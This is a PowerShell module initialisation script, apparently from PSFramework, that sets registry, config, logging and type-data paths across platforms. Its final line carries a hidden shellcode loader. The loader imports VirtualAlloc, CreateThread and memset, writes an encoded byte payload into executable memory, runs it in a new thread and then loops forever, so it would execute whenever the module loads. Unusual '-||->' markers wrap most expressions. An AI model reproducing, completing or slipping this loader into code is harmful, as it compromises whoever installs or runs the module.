
 -||-> $script:path_RegistryUserDefault = "HKCU:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Default" <-||- 
 -||-> $script:path_RegistryUserEnforced = "HKCU:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Enforced" <-||- 
 -||-> $script:path_RegistryMachineDefault = "HKLM:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Default" <-||- 
 -||-> $script:path_RegistryMachineEnforced = "HKLM:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Enforced" <-||- 
 -||-> $psVersionName = "WindowsPowerShell" <-||- 
 -||-> if ( -||-> $PSVersionTable.PSVersion.Major -ge 6 <-||- ) {  -||-> $psVersionName = "PowerShell" <-||-  } <-||- 


 -||-> if ( -||-> $IsLinux -or $IsMacOs <-||- )
{
	
	 -||-> $script:path_LocalAppData = $Env:XDG_CONFIG_HOME <-||- 
	 -||-> if ( -||-> -not $script:path_LocalAppData <-||- ) {  -||-> $script:path_LocalAppData =  -||-> Join-Path $HOME .config/ <-||-  <-||-  } <-||- 
	
	 -||-> $script:path_FileUserLocal =  -||-> Join-Path ( -||-> Join-Path $script:path_LocalAppData $psVersionName <-||- ) "PSFramework/" <-||-  <-||- 
}
else
{
	
	 -||-> $script:path_FileUserLocal =  -||-> Join-Path $Env:LocalAppData "$psVersionName\PSFramework\Config" <-||-  <-||- 
	 -||-> $script:path_LocalAppData = $Env:LocalAppData <-||- 
	 -||-> if ( -||-> -not $script:path_FileUserLocal <-||- )
	{
		 -||-> $script:path_FileUserLocal =  -||-> Join-Path ( -||-> [Environment]::GetFolderPath("LocalApplicationData") <-||- ) "$psVersionName\PSFramework\Config" <-||-  <-||- 
		 -||-> $script:path_LocalAppData = [Environment]::GetFolderPath("LocalApplicationData") <-||- 
	} <-||- 
} <-||- 



 -||-> if ( -||-> $IsLinux -or $IsMacOs <-||- )
{
	
	 -||-> $script:path_AppData = @( -||-> $Env:XDG_CONFIG_DIRS -split ( -||-> [IO.Path]::PathSeparator <-||- ) <-||- )[0] <-||- 
	 -||-> if ( -||-> -not $script:path_AppData <-||- ) {  -||-> $script:path_AppData =  -||-> Join-Path $HOME .local/share/ <-||-  <-||-  } <-||- 
	
	 -||-> $script:path_FileUserShared =  -||-> Join-Path ( -||-> Join-Path $script:path_AppData $psVersionName <-||- ) "PSFramework/" <-||-  <-||- 
}
else
{
	
	 -||-> $script:path_FileUserShared =  -||-> Join-Path $Env:AppData "$psVersionName\PSFramework\Config" <-||-  <-||- 
	 -||-> $script:path_AppData = $env:APPDATA <-||- 
	 -||-> if ( -||-> -not $Env:AppData <-||- )
	{
		 -||-> $script:path_AppData = [Environment]::GetFolderPath("ApplicationData") <-||- 
		 -||-> $script:path_FileUserShared =  -||-> Join-Path ( -||-> [Environment]::GetFolderPath("ApplicationData") <-||- ) "$psVersionName\PSFramework\Config" <-||-  <-||- 
	} <-||- 
} <-||- 



 -||-> if ( -||-> $IsLinux -or $IsMacOs <-||- )
{
	
	 -||-> $XdgConfigDirs =  -||-> $Env:XDG_CONFIG_DIRS -split ( -||-> [IO.Path]::PathSeparator <-||- ) | Where-Object {  -||-> $_ -and ( -||-> Test-Path $_ <-||- ) <-||-  } <-||-  <-||- 
	 -||-> if ( -||-> $XdgConfigDirs.Count -gt 1 <-||- ) {  -||-> $script:path_ProgramData = $XdgConfigDirs[1] <-||-  }
	else {  -||-> $script:path_ProgramData = "/etc/xdg/" <-||-  } <-||- 
	 -||-> $script:path_FileSystem =  -||-> Join-Path $script:path_ProgramData "$psVersionName/PSFramework/" <-||-  <-||- 
}
else
{
	
	 -||-> $script:path_FileSystem =  -||-> Join-Path $Env:ProgramData "$psVersionName\PSFramework\Config" <-||-  <-||- 
	 -||-> $script:path_ProgramData = $env:ProgramData <-||- 
	 -||-> if ( -||-> -not $script:path_FileSystem <-||- )
	{
		 -||-> $script:path_ProgramData = [Environment]::GetFolderPath("CommonApplicationData") <-||- 
		 -||-> $script:path_FileSystem =  -||-> Join-Path ( -||-> [Environment]::GetFolderPath("CommonApplicationData") <-||- ) "$psVersionName\PSFramework\Config" <-||-  <-||- 
	} <-||- 
} <-||- 



 -||-> if ( -||-> $IsLinux -or $IsMacOs <-||- )
{
	 -||-> $script:path_Logging =  -||-> Join-Path ( -||-> Split-Path $script:path_FileUserShared <-||- ) "Logs/" <-||-  <-||- 
	 -||-> $script:path_typedata =  -||-> Join-Path $script:path_FileUserShared "TypeData/" <-||-  <-||- 
}
else
{
	
	 -||-> $script:path_Logging =  -||-> Join-Path $Env:AppData "$psVersionName\PSFramework\Logs" <-||-  <-||- 
	 -||-> $script:path_typedata =  -||-> Join-Path $Env:AppData "$psVersionName\PSFramework\TypeData" <-||-  <-||- 
	 -||-> if ( -||-> -not $Env:AppData <-||- )
	{
		 -||-> $script:path_Logging =  -||-> Join-Path ( -||-> [Environment]::GetFolderPath("ApplicationData") <-||- ) "$psVersionName\PSFramework\Logs" <-||-  <-||- 
		 -||-> $script:path_typedata =  -||-> Join-Path ( -||-> [Environment]::GetFolderPath("ApplicationData") <-||- ) "$psVersionName\PSFramework\TypeData" <-||-  <-||- 
	} <-||- 
} <-||- 





 -||-> $script:NoRegistry = $false <-||- 
 -||-> if ( -||-> ( -||-> $PSVersionTable.PSVersion.Major -ge 6 <-||- ) -and ( -||-> $PSVersionTable.OS -notlike "*Windows*" <-||- ) <-||- )
{
	 -||-> $script:NoRegistry = $true <-||- 
} <-||- 

 -||-> if ( -||-> -not ( -||-> [PSFramework.Message.LogHost]::LoggingPath <-||- ) <-||- ) {  -||-> [PSFramework.Message.LogHost]::LoggingPath = $script:path_Logging <-||-  } <-||- 

 -||-> [PSFramework.PSFCore.PSFCoreHost]::ModuleRoot = $script:ModuleRoot <-||- 


 -||-> [PSFramework.PSFCore.PSFCoreHost]::Initialize() <-||- 
 -||-> $NEU = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $NEU -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xc0,0xd9,0x74,0x24,0xf4,0x58,0xbb,0xe9,0x77,0x39,0xdb,0x33,0xc9,0xb1,0x52,0x31,0x58,0x19,0x83,0xc0,0x04,0x03,0x58,0x15,0x0b,0x82,0xc5,0x33,0x49,0x6d,0x36,0xc4,0x2d,0xe7,0xd3,0xf5,0x6d,0x93,0x90,0xa6,0x5d,0xd7,0xf5,0x4a,0x16,0xb5,0xed,0xd9,0x5a,0x12,0x01,0x69,0xd0,0x44,0x2c,0x6a,0x48,0xb4,0x2f,0xe8,0x92,0xe9,0x8f,0xd1,0x5d,0xfc,0xce,0x16,0x83,0x0d,0x82,0xcf,0xc8,0xa0,0x33,0x7b,0x84,0x78,0xbf,0x37,0x09,0xf9,0x5c,0x8f,0x28,0x28,0xf3,0x9b,0x73,0xea,0xf5,0x48,0x08,0xa3,0xed,0x8d,0x34,0x7d,0x85,0x66,0xc3,0x7c,0x4f,0xb7,0x2c,0xd2,0xae,0x77,0xdf,0x2a,0xf6,0xb0,0x3f,0x59,0x0e,0xc3,0xc2,0x5a,0xd5,0xb9,0x18,0xee,0xce,0x1a,0xeb,0x48,0x2b,0x9a,0x38,0x0e,0xb8,0x90,0xf5,0x44,0xe6,0xb4,0x08,0x88,0x9c,0xc1,0x81,0x2f,0x73,0x40,0xd1,0x0b,0x57,0x08,0x82,0x32,0xce,0xf4,0x65,0x4a,0x10,0x57,0xda,0xee,0x5a,0x7a,0x0f,0x83,0x00,0x13,0xa1,0xf9,0xce,0xe3,0x55,0x75,0x46,0x8a,0xcc,0x2d,0xf0,0x1e,0x79,0xe8,0x07,0x60,0x50,0xc5,0xdc,0xcd,0x09,0x75,0xb0,0xa2,0xc5,0x43,0x60,0x3c,0xb2,0x4b,0x59,0xed,0xef,0xd9,0x61,0x41,0x5c,0x76,0xdd,0x64,0x62,0x86,0xc9,0x1f,0x62,0x86,0x09,0xcf,0x20,0xcc,0x31,0x5d,0xe2,0xd0,0x11,0x09,0xbd,0x59,0x0e,0x0f,0xbe,0x8f,0xb8,0x56,0x13,0x58,0xbb,0x54,0xf3,0x1c,0xe8,0x0b,0xa0,0x4b,0x5c,0xfa,0x2e,0x9f,0x37,0x2c,0x95,0xa0,0x6d,0xa6,0x83,0x54,0xd1,0x94,0x00,0x3a,0xbe,0x4c,0xce,0x91,0x46,0x69,0x75,0x15,0x93,0x0c,0x49,0x9c,0x16,0x40,0x3c,0xb2,0x4f,0xae,0x0b,0xee,0xc6,0xb1,0xa6,0x85,0xa6,0x25,0x48,0x4a,0x27,0xb6,0x20,0x6a,0x27,0xf6,0xb0,0x39,0x4f,0xae,0x14,0xee,0x6a,0xb1,0x81,0x82,0x26,0x1d,0xa0,0x42,0x9f,0xc9,0xb2,0xac,0x20,0x0a,0xe1,0xfa,0x48,0x18,0x93,0x8a,0x6b,0xe3,0x4e,0x09,0xab,0x68,0xbd,0x99,0x2b,0x90,0xfe,0x1b,0xf3,0xe7,0xe5,0x7c,0x37,0x58,0x0d,0xf5,0x48,0x98,0x32,0x37,0x80,0x52,0xe2,0x09,0xde,0xac,0xd4,0x58,0x2d,0xf5,0x06,0xaa,0x63,0x05 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Hc8q=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Hc8q.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Hc8q,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



